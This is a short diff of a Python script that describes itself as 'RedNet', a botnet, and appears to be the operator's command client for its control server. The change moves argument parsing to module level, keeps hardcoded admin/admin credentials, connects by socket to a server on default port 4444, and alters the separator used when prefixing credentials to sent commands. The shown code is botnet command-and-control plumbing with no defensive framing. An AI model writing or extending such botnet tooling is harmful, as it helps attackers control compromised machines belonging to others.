@@ -6,6 +6,14 @@ BUFFER_SIZE     = 1024
 user     = 'admin'
 password = 'admin'
 
+parser = argparse.ArgumentParser(description='RedNet - Botnet developed by Reddy')
+parser.add_argument('--host', type=str, help='IP of server')
+parser.add_argument('--port','-p', type=int, help='PORT of server', default=4444)
+args = parser.parse_args()
+if not args.host:
+        parser.print_help()
+        exit(0)
+        
 root_socket     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 root_socket.connect((args.host,args.port))
 root_socket.send('admin')
@@ -46,23 +54,12 @@ def captureCommand():
             continue
 
 def addCredentials(command):
-    command  = user+'-'+password+':'+command
+    command  = user+'-'+password+'#'+command
     return command
 
 def sendCommands(command):
     root_socket.send(command)
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(description='RedNet - Botnet developed by Reddy')
-    parser.add_argument('--host', type=str, help='IP of server')
-    parser.add_argument('--port','-p', type=int, help='PORT of server', default=4444)
-    args = parser.parse_args()
-    if not args.host:
-        parser.print_help()
-        exit(0)
     starting()
     captureCommand()
-
-        
-            
-
